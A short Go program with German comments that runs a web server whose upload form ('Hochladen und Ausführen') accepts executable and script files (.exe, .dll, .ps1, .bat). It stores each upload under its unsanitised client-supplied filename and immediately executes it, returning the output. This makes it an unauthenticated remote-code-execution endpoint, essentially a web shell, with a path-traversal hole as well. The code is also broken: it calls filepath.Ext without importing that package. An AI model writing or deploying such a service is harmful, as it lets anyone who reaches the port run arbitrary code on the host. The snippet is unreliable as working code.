package main

import (
    "fmt"
    "net/http"
    "os"
    "os/exec"
    "io"
    "strings"
)

func main() {
    http.HandleFunc("/", uploadHandler)
    http.ListenAndServe(":8080", nil)
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
    if r.Method == "POST" {
        file, header, err := r.FormFile("file")
        if err != nil {
            http.Error(w, err.Error(), http.StatusInternalServerError)
            return
        }
        defer file.Close()

        fileName := header.Filename
        // Prüfen, ob die Dateiendung in der Liste erlaubter Endungen ist
        allowedExtensions := []string{".exe", ".dll", ".ps1", ".bat"}
        ext := strings.ToLower(filepath.Ext(fileName))
        allowed := false
        for _, allowedExt := range allowedExtensions {
            if ext == allowedExt {
                allowed = true
                break
            }
        }

        if !allowed {
            http.Error(w, "Ungültige Dateiendung", http.StatusBadRequest)
            return
        }

        // Speichern der hochgeladenen Datei auf dem Server
        outputPath := "./uploads/" + fileName
        outFile, err := os.Create(outputPath)
        if err != nil {
            http.Error(w, err.Error(), http.StatusInternalServerError)
            return
        }
        defer outFile.Close()

        _, err = io.Copy(outFile, file)
        if err != nil {
            http.Error(w, err.Error(), http.StatusInternalServerError)
            return
        }

        // Ausführen der hochgeladenen Datei
        cmd := exec.Command(outputPath)
        output, err := cmd.CombinedOutput()
        if err != nil {
            http.Error(w, err.Error(), http.StatusInternalServerError)
            return
        }

        fmt.Fprintf(w, "Ausgabe:\n%s", output)
    } else {
        // HTML-Formular zur Dateiübertragung anzeigen
        html := `
            <html>
                <body>
                    <form enctype="multipart/form-data" action="/" method="post">
                        <input type="file" name="file" />
                        <input type="submit" value="Hochladen und Ausführen" />
                    </form>
                </body>
            </html>
        `
        fmt.Fprint(w, html)
    }
}
